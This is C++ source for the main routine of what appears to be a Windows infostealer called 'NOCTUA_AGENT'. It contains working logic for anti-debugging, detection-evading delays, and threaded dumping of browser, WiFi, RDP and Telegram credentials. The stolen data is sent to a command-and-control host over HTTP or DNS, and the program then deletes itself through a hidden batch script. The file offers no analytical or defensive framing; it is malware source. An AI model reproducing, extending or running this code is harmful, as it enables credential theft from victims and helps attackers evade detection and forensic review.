#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include "obfuscate.h"
#include "config.h"
#include "dumper.h"
#include "chrome.cpp"
#include "wifi.cpp"
#include "rdp.cpp"
#include "telegram.cpp"
#include "exfil.cpp"

// -------------------------------------------------------------------
// Mutex-based single-instance guard
// -------------------------------------------------------------------
static bool EnsureSingleInstance() {
    HANDLE hMutex = CreateMutexW(nullptr, FALSE, L"NOCTUA_AGENT_INSTANCE");
    if (!hMutex) return false;
    
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return false;
    }
    
    // Keep mutex open for lifetime of process
    // (We intentionally leak it - it'll be cleaned up on process exit)
    return true;
}

// -------------------------------------------------------------------
// Self-delete helper: move exe to temp, run cmd to delete, exit
// -------------------------------------------------------------------
static void SelfDelete() {
    wchar_t modulePath[MAX_PATH];
    if (!GetModuleFileNameW(nullptr, modulePath, MAX_PATH))
        return;
    
    wchar_t tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath))
        return;
    
    wchar_t tempExe[MAX_PATH];
    GetTempFileNameW(tempPath, L"nt", 0, tempExe);
    DeleteFileW(tempExe); // Remove temp file, we'll use the name
    
    // Move executable to temp
    if (!MoveFileExW(modulePath, tempExe, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING))
        return;
    
    // Create batch file for self-deletion
    wchar_t batchPath[MAX_PATH];
    GetTempFileNameW(tempPath, L"ntd", 0, batchPath);
    
    // Write and execute batch that deletes the moved exe and itself
    std::wstring batchContent = L"@echo off\r\n";
    batchContent += L":loop\r\n";
    batchContent += L"del \"" + std::wstring(tempExe) + L"\"\r\n";
    batchContent += L"if exist \"" + std::wstring(tempExe) + L"\" goto loop\r\n";
    batchContent += L"del \"" + std::wstring(batchPath) + L"\"\r\n";
    
    HANDLE hFile = CreateFileW(batchPath, GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, batchContent.c_str(), 
                  batchContent.length() * sizeof(wchar_t), &written, nullptr);
        CloseHandle(hFile);
        
        // Execute batch
        SHELLEXECUTEINFOW sei = {0};
        sei.cbSize = sizeof(sei);
        sei.lpFile = batchPath;
        sei.nShow = SW_HIDE;
        ShellExecuteExW(&sei);
    }
}

// -------------------------------------------------------------------
// Thread for each dumper module, returning results
// -------------------------------------------------------------------
struct DumperThread {
    Dumper* dumper;
    std::vector<DumpResult> results;
    
    DumperThread(Dumper* d) : dumper(d) {}
    
    void Run() {
        if (dumper) {
            results = dumper->Dump();
        }
    }
};

// -------------------------------------------------------------------
// WinMain entry point
// -------------------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // -------------------------------------------------------------------
    // Anti-debug checks
    // -------------------------------------------------------------------
    if (antidebug_CheckAll()) {
        // Debugger detected, exit
        return 0;
    }
    
    // -------------------------------------------------------------------
    // Single instance check
    // -------------------------------------------------------------------
    if (!EnsureSingleInstance()) {
        return 0;
    }
    
    // -------------------------------------------------------------------
    // Staggered delays to avoid detection patterns
    // -------------------------------------------------------------------
    srand(static_cast<unsigned>(GetTickCount()));
    int initialDelay = (rand() % 5000) + 1000; // 1-6 seconds
    Sleep(initialDelay);
    
    // -------------------------------------------------------------------
    // Create all dumpers
    // -------------------------------------------------------------------
    std::vector<Dumper*> dumpers;
    
    // Browser dumpers
    auto browserDumpers = CreateBrowserDumpers();
    dumpers.insert(dumpers.end(), browserDumpers.begin(), browserDumpers.end());
    
    // WiFi dumper
    dumpers.push_back(new WiFiDumper());
    
    // RDP dumper
    dumpers.push_back(new RDPDumper());
    
    // Telegram dumper
    dumpers.push_back(new TelegramDumper());
    
    // -------------------------------------------------------------------
    // Launch dumper threads with staggered delays
    // -------------------------------------------------------------------
    std::vector<DumperThread*> threads;
    std::vector<std::thread*> threadHandles;
    
    for (size_t i = 0; i < dumpers.size(); ++i) {
        DumperThread* dt = new DumperThread(dumpers[i]);
        threads.push_back(dt);
        
        // Launch thread
        threadHandles.push_back(new std::thread([dt]() {
            dt->Run();
        }));
        
        // Staggered delay between thread launches (500ms - 2s)
        int staggerDelay = (rand() % 1500) + 500;
        Sleep(staggerDelay);
    }
    
    // -------------------------------------------------------------------
    // Wait for all threads to complete
    // -------------------------------------------------------------------
    for (auto* th : threadHandles) {
        if (th->joinable())
            th->join();
    }
    
    // Cleanup thread handles
    for (auto* th : threadHandles) delete th;
    threadHandles.clear();
    
    // -------------------------------------------------------------------
    // Collect all results
    // -------------------------------------------------------------------
    std::vector<DumpResult> allResults;
    for (auto* dt : threads) {
        allResults.insert(allResults.end(), 
                          dt->results.begin(), dt->results.end());
        delete dt;
    }
    threads.clear();
    
    // -------------------------------------------------------------------
    // Exfiltrate data
    // -------------------------------------------------------------------
    if (!allResults.empty()) {
        // Additional delay before exfil
        int exfilDelay = (rand() % 3000) + 1000;
        Sleep(exfilDelay);
        
        // Try HTTP first, fallback to DNS then file
        if (EXFIL_METHOD && strcmp(EXFIL_METHOD, "http") == 0) {
            exfil_http(dump_to_json(allResults), C2_HOST, std::stoi(C2_PORT));
        } else if (EXFIL_METHOD && strcmp(EXFIL_METHOD, "dns") == 0) {
            exfil_dns(dump_to_json(allResults), C2_HOST);
        } else if (EXFIL_METHOD && strcmp(EXFIL_METHOD, "file") == 0) {
            exfil_file(dump_to_json(allResults));
        } else {
            // Default: try HTTP, fallback to file, then DNS
            exfil_dispatch(allResults);
        }
    }
    
    // -------------------------------------------------------------------
    // Cleanup dumpers
    // -------------------------------------------------------------------
    for (auto* d : dumpers) delete d;
    dumpers.clear();
    
    // -------------------------------------------------------------------
    // Self-delete if configured
    // -------------------------------------------------------------------
    if (SELF_DELETE && strcmp(SELF_DELETE, "1") == 0) {
        SelfDelete();
    }
    
    return 0;
}
